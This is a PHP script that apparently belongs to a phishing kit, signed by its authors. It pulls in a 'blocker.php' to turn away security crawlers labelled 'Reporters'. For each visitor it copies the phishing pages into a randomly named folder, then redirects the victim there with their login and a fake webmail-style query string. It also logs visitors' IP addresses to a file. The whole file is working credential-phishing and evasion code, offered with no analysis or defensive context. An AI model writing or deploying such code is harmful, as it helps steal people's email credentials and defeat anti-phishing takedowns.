<?php

/*
Author: SOLAREE & HELLION ^^
Author Email: team_pbg@yahoo.com ! 
*/
//Block bots (Reporters)
require_once('blocker.php');

$login = $_GET['login'];
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
$dir = opendir($home);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($home . '/' . $file) ) {
recurse_copy($home . '/' . $file,$DIR . '/' . $file);
}
else {
copy($home . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$home="look";
recurse_copy( $home, $DIR );
header("location:$DIR?login=$login&.verify?&rand=13InboxLightaspxnaspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=.52899642rrehhr3krheehjerhjwegjweeaewfqUTRNakUyTkRRPQ=jY291bnQvc2V0dXAvc3RhcnQ_c=");
$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?>
